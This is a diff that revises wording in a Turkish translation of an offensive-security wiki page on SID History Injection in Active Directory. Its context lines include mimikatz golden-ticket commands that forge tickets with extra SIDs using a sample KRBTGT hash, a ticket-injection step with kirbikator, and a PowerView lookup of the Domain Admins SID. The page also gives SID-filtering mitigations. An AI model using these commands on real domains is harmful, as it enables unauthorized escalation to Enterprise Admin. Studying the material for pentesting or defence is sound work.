@@ -4,7 +4,7 @@
 
 ## SID History Injection Attack
 
-**SID History Injection Attack**'ın odak noktası, **kullanıcıların alanlar arasında göçünü** sağlarken, eski alan kaynaklarına erişimin devamını temin etmektir. Bu, kullanıcının önceki Güvenlik Tanımlayıcısının (SID) yeni hesabının SID Geçmişine **dahil edilmesiyle** gerçekleştirilir. Özellikle, bu süreç, ana alandan yüksek ayrıcalıklı bir grubun (örneğin, Enterprise Admins veya Domain Admins) SID'sini SID Geçmişine ekleyerek yetkisiz erişim sağlamak için manipüle edilebilir. Bu istismar, ana alandaki tüm kaynaklara erişim sağlar.
+**SID History Injection Attack**'ın odak noktası, **kullanıcıların alanlar arasında göçünü** sağlarken, eski alanın kaynaklarına erişimin devamını temin etmektir. Bu, kullanıcının önceki Güvenlik Tanımlayıcısının (SID) yeni hesabının SID Geçmişine **dahil edilmesiyle** gerçekleştirilir. Özellikle, bu süreç, ana alandan yüksek ayrıcalıklı bir grubun (örneğin, Enterprise Admins veya Domain Admins) SID'sini SID Geçmişine ekleyerek yetkisiz erişim sağlamak için manipüle edilebilir. Bu istismar, ana alandaki tüm kaynaklara erişim sağlar.
 
 Bu saldırıyı gerçekleştirmek için iki yöntem vardır: ya bir **Golden Ticket** ya da bir **Diamond Ticket** oluşturmak.
 
@@ -12,7 +12,7 @@ Bu saldırıyı gerçekleştirmek için iki yöntem vardır: ya bir **Golden Tic
 
 Ayrıca, **512** ile biten **Domain Admins** gruplarını da kullanabilirsiniz.
 
-Diğer bir alanın (örneğin "Domain Admins") grubunun SID'sini bulmanın bir başka yolu:
+Diğer bir alanın (örneğin "Domain Admins") grubunun SID'sini bulmanın başka bir yolu:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
@@ -24,7 +24,7 @@ Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSi
 - **Dış güvenlere SID Filtreleme Karantinası uygulama** netdom aracı kullanılarak (`netdom trust /domain: /quarantine:yes on the domain controller`)
 - **Tek bir orman içindeki alan güvenlerine SID Filtreleme uygulamak** önerilmez çünkü bu desteklenmeyen bir yapılandırmadır ve kırıcı değişikliklere neden olabilir. Eğer bir orman içindeki bir alan güvenilir değilse, o ormanın üyesi olmamalıdır. Bu durumda, güvenilir ve güvenilir olmayan alanların ayrı ormanlara bölünmesi ve burada SID Filtrelemenin bir interforest güvenine uygulanması gereklidir.
 
-Bununla ilgili daha fazla bilgi için bu gönderiyi kontrol edin: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Bu konuda daha fazla bilgi için bu gönderiyi kontrol edin: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
@@ -63,12 +63,14 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 ```
 Daha fazla bilgi için golden ticket'lar hakkında kontrol edin:
 
+
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
 
 Daha fazla bilgi için diamond ticket'lar hakkında kontrol edin:
+
 
 {{#ref}}
 diamond-ticket.md
@@ -78,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Kompromize edilmiş alanın KRBTGT hash'ini kullanarak kök veya Enterprise admin'e yükseltin:
+Kompromize edilmiş alanın KRBTGT hash'ini kullanarak root veya Enterprise admin'e yükseltin:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
